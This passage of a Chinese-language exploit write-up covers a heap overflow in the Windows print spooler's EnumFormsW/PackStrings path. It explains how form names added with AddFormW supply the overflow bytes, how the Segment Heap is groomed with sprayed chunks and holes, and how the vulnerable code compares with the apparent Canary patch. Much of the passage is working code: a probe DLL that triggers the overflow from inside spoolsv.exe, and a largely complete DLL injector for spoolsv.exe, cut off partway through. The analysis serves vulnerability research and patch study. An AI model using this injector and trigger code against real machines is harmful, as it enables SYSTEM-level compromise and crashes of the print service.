漏洞就在于调用方撒谎：把 cbBuf 报成 2GB（仅作示意），而 pForm 只指着几千字节，服务端信了数字而不是缓冲区。崩溃已经够糟了，更糟的是攻击者可以构造精确的“数据包”，控制拷贝落点的位置。

EnumFormsW 的另一个细节是 Level 参数，它选择输出记录格式：

-   Level 1 → FORM_INFO_1：x64 上每条 40 字节
    
-   Level 2 → FORM_INFO_2：x64 上每条 88 字节
    

本文用 FORM_INFO_1——exploit 用的也是它，布局如下：

```
typedef struct _FORM_INFO_1W {
    DWORD  Flags;
    LPWSTR pName;
    SIZEL  Size;
    RECTL  ImageableArea;
} FORM_INFO_1W, *PFORM_INFO_1W;
```

稍后 exploit 会读取 pName（偏移 +8）来定位自己的表单。FORM_INFO_2 在此基础上扩展了 pKeyword、StringType、pMuiDll、dwResourceId、pDisplayName 和 wLangId，大小达到 88 字节。因为它有更多指针字段，可攻击的字符串也更多。不过两个 level 都可利用，我只是图简单选了 Level 1。

细心的读者会发现，最核心的事实是：每条记录都包含一个指向变长字符串的指针——这就是输出不能是扁平数组的原因，所以才需要一套打包例程来处理。正是在这个背景下，PackStrings 例程登场。

表单有名字，名字是变长字符串，所以输出缓冲区不可能简单等于“count \* sizeof(FORM_INFO_1)”。spooler 用一个贯穿其代码库的约定解决这个问题，由 PackStrings（内部函数）实现，打包逻辑类似下面的代码：

```go
// dst      = caller buffer (pForm)
// cbBuf    = caller-declared size
// pEnd     = dst + cbBuf          the "back" of the buffer
// records  written from the FRONT (dst) upward
// strings  written from the BACK  (pEnd) downward

for each form f (front to back):
    write the 40-byte FORM_INFO_1 record at the current front cursor
    len = (wcslen(f.name) + 1) * sizeof(WCHAR)
    pEnd -= len                              // carve string space off the back
    memcpy(pEnd, f.name, len)                // the write that overflows
    record.pName = pEnd                      // fix up the pointer to the packed copy
```

本文的利用有两个设计上的关键事实：

-   **字符串区相对 `dst + cbBuf` 定位，而不是相对真实分配区。**
    
    一旦把 cbBuf 吹大，pEnd 就向高地址移动，整个字符串块随之“滑”向高地址——可能滑出缓冲区、落进堆上任意相邻 chunk。毫不意外，服务端从不检查 pEnd 是否还在真实分配区的边界之内。
    
-   **PackStrings 拷贝的是表单名**
    
    ——就是打印时看到的 Letter、Legal、A4 这些名字。表单名可由调用方添加自定义表单来控制；从利用视角看，PackStrings 就是一个“把字节拷到受控地址”的 primitive。
    

稍后读崩溃栈时会看到，出错指令正是 ucrtbase!memcpy，由 PackStrings 函数直接调用——它把字符串拷到缓冲区后端，越过了边界，写进堆上相邻 chunk。读过本系列前几篇的读者应该记得，Windows 内存管理这一次依然是关键，尤其是 Segment Heap。

关于 PackStrings 本身，值得一提的是它的行为：记录从 pForm 开始向前写，名字字符串从（正确大小的缓冲区的）末端向后写，布局形如：

```
(pForm) rec0 rec1 rec2........<free gap>..... A4\0  Legal\0  Letter\0 (pEnd -- packed strings)
```

因此，触发攻击的内容通道毫无疑问是 AddForm 函数，其原型给出了方向：

```
BOOL AddFormW(HANDLE hPrinter, DWORD Level, LPBYTE pForm);   // pForm points to FORM_INFO_1
```

每条 FORM_INFO_1 记录的 pName 属性（见前文伪代码）指向上图后端区域里自己的名字。这个 pName 稍后由 EnumForms 函数交还、再被 PackStrings 拷贝。表单名（Unicode 字符串）的内容没有任何限制——用 AddFormW 函数，就等于向 PackStrings 将要溢出的缓冲区注入任意字节。

理解这个机制很重要：想让 8 个特定字节出现在溢出里，就添加一个名字恰好是这 8 个字节的 Unicode 字符串的表单。因此 AddFormW 决定“溢出什么”，但它自己不负责溢出。溢出本身要到 EnumForms 以超大的 cbBuf 参数被调用时才开始——数据返回路径内部触达 PackStrings 字符串，后者调用 memcpy 引爆溢出。顺便一提：添加表单需要 PRINTER_ACCESS_ADMINISTER 访问权。于是整条序列是：AddFormW（写什么）→ EnumForms → CopyIniFormToFormInfo → PackStrings → memcpy。注意：AddFormW 到 EnumForms 之间的过渡不是函数调用，只是数据依赖——它们本是两次独立的 RPC 调用。

## 07\. 堆相关要点

这是一个经典堆溢出，涉及堆内存管理的概念——细节我们在本系列前几篇里已经学过。本次利用涉及的对象约 10 KB（精确说是 0x2780 字节），由 Variable Size（VS）分配器分配（它接受 128 KB 以下的分配），可以在 spoolsv.exe 进程里用 `!heap -s` （SegmentHeap）验证（见 \_HEAP_VS_CONTEXT（VsContext））。记住这条链：LFH → VS 分配器 → 后端 | 大块。

堆的这个区域里，VS 分配器从后端取大块 subsegment，再在其中切分 chunk；每个 chunk 前面有一个 16 字节的头（\_HEAP_VS_CHUNK_HEADER），存放 chunk 大小、前一 chunk 大小和分配标志等值。读者已经知道，这些字段多数用每个堆独有的密钥做了 XOR 编码，内存分配器因此很容易发现篡改。所以我们没法让分配器“走”过一个被破坏的头，但可以覆写头之后的数据、再调用函数指针。布局大致是：

```
16 字节 VS 头 → chunk 数据 (0x2780) → 16 字节 VS 头 → chunk 数据 → 16 字节 VS 头
```

考虑到测试涉及的数据是 0x2780 字节、chunk 头是 0x10 字节，总共就是 0x2790 字节——但读者会注意到，这个值并没有写死在 exploit 里。0x2780 处于边界上，分配器需要对数据大小向上取整。

VS 分配器是确定性的：分配许多同样大小的块，它们往往会在某个 subsegment 内连续且相邻地排布。这种布局允许我们打洞，再把新对象分配进任意一个洞里。于是流程和前几篇类似：先 spray 大量目标尺寸（0x2780，加上头变成 0x2790）的块/对象，按 N 的间隔（比如每 4 块）打出可预测的洞，再分配 EnumForms 的输出缓冲——它应当落进其中一个洞。回顾前文：

```
spray:  [spray] [spray] [spray] [spray] [spray] [spray] [spray] [spray] [spray] [spray] [spray] [spray]
holes:  [spray] [spray] [spray] [hole ] [spray] [spray] [spray] [hole ] [spray] [spray] [spray] [hole ]
victim: [spray] [spray] [spray] [victim] [spray] [spray] [spray] [hole ] [spray] [spray] [spray] [hole ]
```

前文提到的另一个要点：增大 cbBuf 参数会把 PackStrings 的内容推过 victim chunk 的末尾。视调整方式而定，我们可以只覆写相邻 chunk 的头，或者连它的数据一起覆写：

```
[Form structs -- grows up] [gap] [packed strings -- grows down] [VS header] [data]
```

这里有个关键细节：cbBuf 代表的是 Form 结构体 + 打包字符串的总和。所以增大 cbBuf 实际上是在扩大 gap，把打包字符串整体推到相邻缓冲区之上。

## 08\. 技术验证与实验

进入真正的利用之前，先验证设想的写 primitive 是否如预期工作。做法是：经 `VirtualAlloc(MEM_RESERVE, PAGE_NOACCESS)` 保留若干 N + 0x1000 字节，但只把前 N 字节提交为 PAGE_READWRITE。内存布局为：\[已提交 RW | No Access | 未映射\]。

这样收窄了写的可能性：一旦发生 OOB 写，就会碰到 No Access 区引发 ACCESS_VIOLATION，证明写越过了边界进入相邻区域，即确认 OOB 写存在。当然，真实 exploit 会丢掉 guard page，转而 groom 一块真实可写的相邻 chunk——毕竟最终要的是破坏效果，但不能崩。为此，我们的部分代码包在 `__try / __except(EXCEPTION_EXECUTE_HANDLER)` 里，并用 GetExceptionCode 函数辅助构建可脚本化的探针，避免 ACCESS_VIOLATION 冲到 UnhandledExceptionFilter 把 spoolsv.exe 干掉。

下一步是调用 spoolss!EnumFormsW 来用这个 bug，但绕开 winspool.drv 的代码。麻烦在于：Windows 11 上没有远程管道可发原始 RPC，而利用强依赖 pForm 与 cbBuf 互相独立。更糟的是，只有 spoolsv 内部的导出函数才会把这两个参数原样传给 provider，中间没有 RPC 编组把它们绑在一起。给读者理一下场景：

-   **winspool.drv!EnumFormsW**
    
    ：应用程序调用的客户端 API。通常它会校验参数，然后把请求经 RPC 发出去。
    
-   **spoolss.dll!EnumFormsW**
    
    ：服务端的重定向器，接下调用、转发给打印 provider。
    
-   **spoolsv.exe 与 localspl.dll**
    
    ：执行缓冲拷贝的 worker 和 provider。
    

我们的计划是直达服务端触发拷贝，绕过客户端 API 的一切校验——若走 winspool.drv，参数会被检查，任何畸形调用在碰到 bug 之前就被掐死。所以必须跳过客户端、直接调服务端的路由器。照理说，最值得推荐的做法之一是手工构造原始 RPC 包发到 spooler 的网络端点（ `\pipe\spoolss` ）。但又一次碰壁：没有暴露给网络的管道，Windows 11 上没有这条“正路”。

上面提到的另一个要点：要触发溢出，必须让 pForm 和 cbBuf 互相独立——小缓冲配大 cbBuf 正是我们要的。这是利用这个 bug 最核心的一点：pForm 给一块小缓冲，cbBuf 却声明一个巨大的尺寸。由于拷贝的落点由 `pForm + cbBuf` 的偏移决定，大 cbBuf 加小缓冲必然越界、覆写相邻内存。遗憾的是，走 RPC 通信时我们做不到两者独立——接口定义里 pForm 数组由 cbBuf 决定，NDR 编组会强制传输层只携带 cbBuf 给定的字节数，没法“声明一个值、传输另一个值”。而 spoolss!EnumFormsW → spoolsv!EnumFormsW 这条路恰好能原样处理我们传入的 pForm 和 cbBuf，不受任何 NDR 干扰，两个参数因此得以保持独立。

要让代码跑进 spoolsv.exe 并直接调用重定向器，就得用 DLL 注入。老实说，我没花足够时间找别的路子；但看起来，要把互相独立的 pForm 和 cbBuf（小缓冲配大声明）送到带漏洞的拷贝面前，唯一的办法就是人在 spoolsv 里、自己调 spoolss!EnumFormsW（先 `GetModuleHandle(“spoolss.dll”)` 再 `GetProcAddress(“EnumFormsW”)` ），而要进 spoolsv 就得注入 DLL。这方案干净吗？不干净。但如我所说，我没在它身上投入足够的时间。

不出所料，这个 exploit 的软肋也正在这里：向 SYSTEM spooler 注入 DLL 需要 SeDebugPrivilege，只有管理员有；可管理员权限本身永远变不成 SYSTEM——这是个循环依赖。务实的破解办法就是：把代码放进 spooler 进程，用这个现成的 bug 劫持 SYSTEM 进程内的执行流来达成真正的提权，而不是靠权限本身。顺带一提：我们必须用工作线程，别在 DllMain 里执行代码——那是在锁下运行，可能死锁。

流程遵循这样的方案：

-   注入器（admin + SeDebug）：EnableDebugPrivilege → OpenProcess(spoolsv) → VirtualAllocEx → WriteProcessMemory（写入 DLL 路径）→ CreateRemoteThread(LoadLibraryW) → DllMain → WorkerThread（注入后在 spoolsv 内部、以 SYSTEM 运行）。
    
-   进入 spoolsv.exe 之后：
    

-   方案 A：spoolss.dll!EnumFormsW → spoolsv!EnumFormsW → localspl（原始 pForm + 原始 cbBuf，无 NDR，以 SYSTEM 运行）
    
-   方案 B：winspool.drv!EnumFormsW → 经 RPC 绕回 spoolsv（重新进进程、重新加上客户端侧校验）
    

我自然选了方案 A——选 B 会出问题。

处理宽字符串拷贝时我遇到过一个坑：字符串在第一个 NULL 宽字符处终止，而 64 位用户态代码地址长得像 0x00007FFFF8BC1B90，按小端序排列后结尾就是 0x0000。分析之后我发现这反而是好事——真正的麻烦是低位的三个字（word）里出现零字：字符串会提前终止、截断指针。解决办法是造一个 trampoline：在一块“低位字节不含任何 NULL 字”的地址上分配可执行页。找这个地址的基本方法是让 VirtualAlloc 从 0x10010000 开始、按 0x10000 步进向上试，直到找到为止。

作为补充，我在主流版和 Canary 版之间做了 binary diffing。看起来微软已经在修通往这个 bug 的路径——Canary 里出现的几处检查，主流版还没有。我注意到的改进包括整数溢出保护、缓冲区上下界检查、RPC 调用方授权，但它们尚未封死我们的利用路径。

读主流版的 RPC worker，序列是：localspl!SplEnumForms → localspl!InternalEnumForms → localspl!CopyIniFormToFormInfo → PackStrings → memcpy。

检查主流版 localspl.dll（v10.0.26100.7689）和 spoolsv.exe（v10.0.26100.7689）的代码，bug 所在的序列如下：

```
01. localspl!InternalEnumForms
        cmp esi, r12d ; jbe      <- 仅有的大小检查（needed 对 cbBuf）
        lea rsi,[rdi+r12]        <- v15 = &pForm[cbBuf]（缓冲区的后端/末端）

02. localspl!CopyIniFormToFormInfo    (level 2 在这里自己做 memcpy)

03. PackStrings → ucrtbase!memcpy
        v7 -= len;
        memcpy(v7, name, len)    <- OOB 写发生处

04. back/end of buffer = pForm+cbBuf;
```

反编译代码（localspl!InternalEnumForms，加了一些标注和高亮）如下：

```cpp
__int64 __fastcall InternalEnumForms(struct _INISPOOLER *a1, unsigned int a2,
        unsigned __int8 *a3, unsigned int a4, unsigned int *a5, _DWORD *a6)
{                           // a2 = level, a3 = pForm and a4 = cbBuf
    __int64 v6 = a4;        // v6 = cbBuf
    ...
    // PASS 1: 把每个表单的尺寸累加进 v11，
    // 且带真正的整数溢出保护。

    while ( 1 ) {
        FormSize = GetFormSize((struct _INIFORM *)v10, a2);
        if ( GetLastError() == 534 ) break;
        v11 += FormSize;
        if ( v11 < FormSize ) break;             // overflow of the sum is checked...
        v10 = *(_QWORD *)(v10 + 8);
        if ( !v10 ) goto LABEL_20;
    }
    ... "Returning ... because of Integer Overflow." ; return 0;

LABEL_20:
    *a5 = v11;                                    // *pcbNeeded = needed

    if ( v11 > (unsigned int)v6 )                 // THE ONLY SIZE CHECK:
    {                                             //  needed > cbBuf ?
        SetLastError(0x7Au);                      //      0x7A = ERROR_INSUFFICIENT_BUFFER
        LeaveSplSem(); return 0;
    }

    v14 = *((_QWORD *)a1 + 9);
    v15 = &a3[v6];                                // v15 = pForm + cbBuf (back/end of the buffer)

    // PASS 2: 拷贝每个表单，
    // v15（"缓冲区后端/末端"）被交给 CopyIniFormToFormInfo

    while ( 1 ) {
        v16 = GetFormSize((struct _INIFORM *)v14, a2);
        if ( GetLastError() == 534 ) break;
        v15 = CopyIniFormToFormInfo((struct _INIFORM *)v14, a2, a3, v16, v15);   // copy
        ...
        if ( a2 == 1 )      a3 += 40;             // front buffer grows UP (records, as explained)
        else if ( a2 == 2 ) a3 += 88;
        v14 = *(_QWORD *)(v14 + 8);
        ++*a6;
        if ( !v14 ) goto LABEL_36;
    }
}
```

PackStrings 函数拿到同一个“缓冲区后端/末端”地址并执行真正的字节拷贝。它是 spooler 在多个模块里都带着的共享打包助手。在潜在的崩溃栈里，调用链是 localspl!CopyIniFormToFormInfo → spoolss!PackStrings → spoolsv!PackStrings → ucrtbase!memcpy。从栈的角度看，出错帧是 spoolsv!PackStrings，其 memcpy_0 即 ucrtbase!memcpy，如下：

```cpp
unsigned __int8 *__fastcall PackStrings(unsigned __int16 **a1, unsigned __int8 *a2,
        unsigned int *a3, unsigned __int64 a4)
{                                  // a2 = front (pForm)   a4 = end pointer (= pForm + cbBuf)

    if ( !a1 || !a2 || !a3 || !a4 || a4 < (unsigned __int64)a2 ) return 0;

    v7 = (unsigned __int8 *)(a4 & 0xFFFFFFFFFFFFFFFEuLL);   // v7 = end pointer (aligned)

    while ( v7 >= a2 ) {                                    // while back >= front...
        v8 = *v4;
        v9 = (_DWORD)v7 - (_DWORD)a2;                       // gap between back and front

        if ( (int)v7 - (int)a2 < (unsigned int)(v8 + 8) ) { ... return v7; }   // gap check

        v10 = *v6;                                          // the string pointer

        if ( v10 ) {
            v11 = -1; while ( v10[++v11] != 0 ) ;
            v13 = 2 * v11 + 2;                              // byte length incl. NUL

            if ( v9 < v13 || v9 - v13 < (int)v8 + 8 ) { ... return v7; }        // overflow check

            v7 -= v13;                                      // move back pointer down
            memcpy_0(v7, v10, v13);                         // the key write (ucrtbase!memcpy)
            *(_QWORD *)&a2[*v4] = v7;                       // fix up record's pName -> packed string
        }
        ...
    }
    return v7;
}
```

微妙之处在于：PackStrings 函数确实有一些内部健全性检查，但它们都以 a2（指向缓冲区前端 pForm）和 v7/a4（后端，即 pForm + cbBuf）为基准表达，只保证前后两个指针在窗口内不相撞。然而，PackStrings、CopyIniFormToFormInfo、InternalEnumForms 三者中没有任何一处检查 `a4 = pForm + cbBuf` 是否落在调用方真实分配的内存之内，所以 memcpy_0(v7, v10, v13) 完全可以写到 `pForm + cbBuf - v13` ——真实缓冲区之外。毫无疑问，这就是崩溃时 ucrtbase!memcpy+0x93 那条关键指令；只要能把周边内存区域 groom 好，它就送我们一个写 primitive。

Windows Canary 里这段代码已经被重写：打包路径补上了缺失的边界检查，拷贝循环之前还加了尺寸累加校验、重新推导真实总量，除非每个偏移都待在真实缓冲区内，否则拒绝继续。来看看几个主流版上没有的检查：

```cpp
for ( i = 0; ; ++i ) {
    v21 = 32LL * i;
    if ( *(_DWORD *)&v12[v21] == -1 ) break;        // check 5: end-of-fields sentinel
    v22 = *(_DWORD *)&v12[v21 + 24];
    if ( (unsigned int)(v22 - 1) <= 8 ) { v23 = 4; v24 = 4; } // check 6: field-type range (1 to 9)
    else { if ( v22 ) goto LABEL_37; v23 = *(_QWORD*)&v12[v21+8]; v24 = *(_QWORD*)&v12[v21+16]; }

    v25 = -v24 & (v24 + v19 - 1);
    if ( v25 > 0xFFFFFFFFLL - v23 ) { v26 = 534; goto LABEL_38; }   // check 1: integer overflow guard
    v19 = v23 + v25;                                // accumulate true size
}
v27 = (v19 + 3) & 0xFFFFFFFFFFFFFFFCuLL;
if ( v27 <= v46 )                                   // check 2: total <= real buffer end
{
    for ( j = (__int64)v15; ; j += v27 ) {
        if ( v29 >= v44 ) break;                    // check 3: stay within the count/extent
        ...                                         // only now does it copy/fix up
    }
}
```

为了证明潜在的利用条件，下面给出两个不同的程序。第一个走传统路径，数据经 winspool.drv，与应用的正常做法一模一样；第二个调用同一个函数，但这次是从 spoolsv.exe 内部直连重定向器 spoolss!EnumFormsW。我知道测试很简单，但它清楚地展示了路径不同、结果不同：经客户端库发送的数据被拒绝，直连服务端的数据毫无障碍地被接受。

第一个程序里，EnumFormsW 经 winspool.drv 从普通进程调用。源码如下：

```cpp
/*
 * test_spoolsv_enumforms.c - Test for missing bounds in YEnumForms
 *   safe test: normal winspool.drv API calls; does not attempt to crash.
 *   Compile: cl /W4 test_spoolsv_enumforms.c winspool.lib
 */

#include <windows.h>
#include <winspool.h>
#include <stdio.h>

#pragma comment(lib, "winspool.lib")

void test_enumforms(HANDLE hPrinter, DWORD level, DWORD bufSize) {
    DWORD needed = 0, returned = 0;
    BYTE *buffer = NULL;

    if (bufSize > 0) {
        buffer = (BYTE *)malloc(bufSize);
        if (!buffer) { printf("  malloc(%u) failed\n", bufSize); return; }
        memset(buffer, 'A', bufSize);
    }

    printf("  EnumForms(level=%u, buf=%p, size=%u): ", level, buffer, bufSize);

    BOOL result = EnumFormsW(hPrinter, level, buffer, bufSize, &needed, &returned);
    DWORD err = GetLastError();

    if (result) printf("SUCCESS (returned=%u, needed=%u)\n", returned, needed);
    else        printf("FAILED (err=%u, needed=%u)\n", err, needed);

    if (buffer) free(buffer);
}

int main(void) {
    HANDLE hPrinter = NULL;
    PRINTER_DEFAULTSW defaults = {0};

    printf("=== spoolsv YEnumForms Bounds Test ===\n\n");

    defaults.DesiredAccess = PRINTER_ACCESS_USE;

    if (!OpenPrinterW(NULL, &hPrinter, &defaults)) {
        if (!OpenPrinterW(NULL, &hPrinter, NULL)) {
            printf("Cannot open printer (err=%u)\n", GetLastError());
            if (!OpenPrinterW(L",XcvMonitor Standard TCP/IP Port", &hPrinter, NULL)) {
                printf("Cannot open any printer target\n");
                return 1;
            }
        }
    }
    printf("Printer opened: handle=0x%p\n\n", hPrinter);

    printf("[1] Normal call (level 1, 0 buffer):\n");   test_enumforms(hPrinter, 1, 0);
    printf("[2] Normal call (level 1, 4096 buffer):\n"); test_enumforms(hPrinter, 1, 4096);
    printf("[3] Level 2 (level 2, 4096 buffer):\n");     test_enumforms(hPrinter, 2, 4096);
    printf("[4] Invalid level (level 99):\n");           test_enumforms(hPrinter, 99, 4096);
    printf("[5] Level 0 (boundary):\n");                 test_enumforms(hPrinter, 0, 4096);
    printf("[6] Small buffer but request large needed:\n"); test_enumforms(hPrinter, 1, 8);
    printf("[7] Overflow test (level 1, size=0):\n");    test_enumforms(hPrinter, 1, 0);

    ClosePrinter(hPrinter);
    printf("\n=== Test Complete ===\n");
    return 0;
}
```

在主流或 Canary 版 Windows 上编译运行，输出如下：

```
C:\Users\Administrator\ers11> cl /W4 test_spoolsv_enumforms.c winspool.lib

C:\Users\Administrator\ers11> test_spoolsv_enumforms.exe

=== spoolsv YEnumForms Bounds Test ===

Printer opened: handle=0x0000028C0D15D000

[1] Normal call (level 1, 0 buffer):
  EnumForms(level=1, buf=0000000000000000, size=0): FAILED (err=122, needed=10112)

[2] Normal call (level 1, 4096 buffer):
  EnumForms(level=1, buf=0000028C0D173D70, size=4096): FAILED (err=122, needed=10112)

[3] Level 2 (level 2, 4096 buffer):
  EnumForms(level=2, buf=0000028C0D173D70, size=4096): FAILED (err=122, needed=102160)

[4] Invalid level (level 99):
  EnumForms(level=99, buf=0000028C0D173D70, size=4096): FAILED (err=124, needed=0)

[5] Level 0 (boundary):
  EnumForms(level=0, buf=0000028C0D173D70, size=4096): FAILED (err=124, needed=0)

[6] Small buffer but request large needed:
  EnumForms(level=1, buf=0000028C0D171630, size=8): FAILED (err=122, needed=10112)

[7] Overflow test (level 1, size=0):
  EnumForms(level=1, buf=0000000000000000, size=0): FAILED (err=122, needed=10112)

=== Test Complete ===
```

如果第 4/5 项在主流版返回 SUCCESS 而在 Canary 上是 FAILED，就说明边界检查缺失。

第二个程序从 spoolsv.exe 内部直接调用 spoolss!EnumFormsW。基本做法是把 DLL 注入 spooler，并在 SEH 保护下运行，出事也能活下来。payload 源码如下：

```cpp
/*
 * payload_enumforms2.c - injected into spoolsv.exe; calls spoolss!EnumFormsW
 *   directly (the router), NOT winspool.drv (which would RPC back to self).
 *   Compile: cl /W4 /O2 /LD payload_enumforms2.c /Fe:payload_probe.dll
 */

#include <windows.h>
#include <stdio.h>

#define LOG_FILE "C:\\Windows\\Temp\\enumforms_inject_log.txt"

static FILE *g_log = NULL;

static void LOG(const char *fmt, ...) {
    va_list ap; if (!g_log) return;
    va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap); fflush(g_log);
}

typedef BOOL (WINAPI *PFN_OpenPrinterW)(LPWSTR, LPHANDLE, LPVOID);
typedef BOOL (WINAPI *PFN_EnumFormsW)(HANDLE, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *PFN_ClosePrinter)(HANDLE);

/* one probe case: a real buffer of bufSize, call the router under SEH, log it */
static void run_one_test(const char *desc, DWORD level, DWORD bufSize,
                         PFN_EnumFormsW pEnum, HANDLE hPrinter) {
    DWORD need = 0, ret = 0; BYTE *buf = NULL;

    if (bufSize > 0 && bufSize < 0x40000000) {
        buf = (BYTE *)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) { LOG("  [%s] alloc failed\n", desc); return; }
    }

    LOG("  [%s] EnumForms(L%u, cb=0x%X): ", desc, level, bufSize);

    __try {
        BOOL ok = pEnum(hPrinter, level, buf, bufSize, &need, &ret);
        DWORD err = GetLastError();
        if (ok) LOG("SUCCESS (ret=%u, need=%u)\n", ret, need);
        else    LOG("ERROR %u (need=%u)\n", err, need);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        LOG("EXCEPTION 0x%08X *** CRASH ***\n", GetExceptionCode());
    }

    if (buf) VirtualFree(buf, 0, MEM_RELEASE);
}

static void run_tests(void) {
    HMODULE hSpoolss;
    PFN_OpenPrinterW pOpen = NULL; PFN_EnumFormsW pEnum = NULL; PFN_ClosePrinter pClose = NULL;
    HANDLE hPrinter = NULL;

    hSpoolss = GetModuleHandleW(L"spoolss.dll");
    if (!hSpoolss) hSpoolss = LoadLibraryW(L"spoolss.dll");

    pOpen  = (PFN_OpenPrinterW)GetProcAddress(hSpoolss, "OpenPrinterW");
    pEnum  = (PFN_EnumFormsW)GetProcAddress(hSpoolss, "EnumFormsW");
    pClose = (PFN_ClosePrinter)GetProcAddress(hSpoolss, "ClosePrinter");

    if (!pOpen || !pEnum || !pClose) { LOG("[-] missing exports\n"); return; }

    __try {
        if (!pOpen(NULL, &hPrinter, NULL)) { LOG("[-] OpenPrinter %u\n", GetLastError()); return; }
    } __except (EXCEPTION_EXECUTE_HANDLER) { LOG("[-] OpenPrinter exception\n"); return; }

    LOG("=== VALID LEVELS ===\n");
    run_one_test("ok", 1, 0,     pEnum, hPrinter);
    run_one_test("ok", 2, 0,     pEnum, hPrinter);
    run_one_test("ok", 1, 16384, pEnum, hPrinter);

    LOG("\n=== INVALID LEVELS (no client-side validation here!) ===\n");
    run_one_test("BAD", 99,         4096, pEnum, hPrinter);
    run_one_test("BAD", 0,          4096, pEnum, hPrinter);
    run_one_test("BAD", 3,          4096, pEnum, hPrinter);
    run_one_test("BAD", 0xFFFFFFFF, 4096, pEnum, hPrinter);
    run_one_test("BAD", 0x80000000, 4096, pEnum, hPrinter);

    LOG("\n=== LARGE BUFFERS (overflow test) ===\n");
    run_one_test("1MB",  1, 0x100000,  pEnum, hPrinter);
    run_one_test("16MB", 1, 0x1000000, pEnum, hPrinter);
    run_one_test("64MB", 1, 0x4000000, pEnum, hPrinter);

    LOG("\n=== ARITHMETIC OVERFLOW TRIGGERS ===\n");
    run_one_test("2G-64", 1, 0x7FFFFFC0, pEnum, hPrinter);

    __try { pClose(hPrinter); } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

static DWORD WINAPI WorkerThread(LPVOID p) {
    (void)p; Sleep(1000);
    g_log = fopen(LOG_FILE, "w");
    if (g_log) { run_tests(); fclose(g_log); g_log = NULL; }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
    (void)r;
    if (reason == DLL_PROCESS_ATTACH) { DisableThreadLibraryCalls(h);
        CreateThread(NULL,0,WorkerThread,NULL,0,NULL); }
    return TRUE;
}
```

注入器的源码如下：

```
C:\Users\Administrator\ers11> cat inject_enumforms.c
```

```cpp
/*
 * inject_enumforms.c -- Injector: loads our DLL into spoolsv.exe
 *
 * 1. Finds spoolsv.exe PID
 * 2. Opens the process
 * 3. Allocates memory in spoolsv
 * 4. Writes the DLL path
 * 5. Creates remote thread calling LoadLibraryW
 * 6. DLL's DllMain calls YEnumForms directly
 *
 * Compile: cl /W4 /O2 inject_enumforms.c advapi32.lib
 * Must run as Administrator (needs SeDebugPrivilege)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    return ok && GetLastError() == ERROR_SUCCESS;
}

static DWORD FindProcessByName(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

int wmain(int argc, wchar_t *argv[]) {
    wchar_t dllPath[MAX_PATH];
    DWORD pid;
    HANDLE hProcess, hThread;
    LPVOID remoteMem;
    SIZE_T written;
    DWORD exitCode;

    printf("============================================================\n");
    printf("  spoolsv.exe DLL Injector for YEnumForms Test\n");
    printf("============================================================\n\n");

    /* Get DLL path */
    if (argc > 1) {
        wchar_t rawPath[MAX_PATH];
        wcscpy_s(rawPath, MAX_PATH, argv[1]);
        if (!GetFullPathNameW(rawPath, MAX_PATH, dllPath, NULL)) {
            wcscpy_s(dllPath, MAX_PATH, rawPath);
        }
    } else {
        /* Default: same directory as injector */
        GetModuleFileNameW(NULL, dllPath, MAX_PATH);
        wchar_t *lastSlash = wcsrchr(dllPath, L'\\');
        if (lastSlash) *(lastSlash + 1) = 0;
        wcscat_s(dllPath, MAX_PATH, L"payload_enumforms.dll");
    }

    printf("[*] DLL: %S\n", dllPath);

    /* Verify DLL exists */
    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not found: %S\n", dllPath);
        return 1;
    }

    /* Enable SeDebugPrivilege */
    if (!EnableDebugPrivilege()) {
        printf("[!] Warning: Could not enable SeDebugPrivilege\n");
    } else {
        printf("[+] SeDebugPrivilege enabled\n");
    }

    /* Find spoolsv.exe */
    pid = FindProcessByName(L"spoolsv.exe");
    if (!pid) {
        printf("[-] spoolsv.exe not found\n");
        return 1;
    }
    printf("[+] spoolsv.exe PID: %u\n", pid);

    /* Open process */
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %u\n", GetLastError());
        return 1;
    }
    printf("[+] Process opened\n");

    /* Allocate memory in spoolsv for DLL path */
    SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    remoteMem = VirtualAllocEx(hProcess, NULL, pathSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %u\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    /* Write DLL path */
    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathSize, &written)) {
        printf("[-] WriteProcessMemory failed: %u\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] DLL path written to spoolsv @ 0x%p\n", remoteMem);

    /* Get LoadLibraryW address */
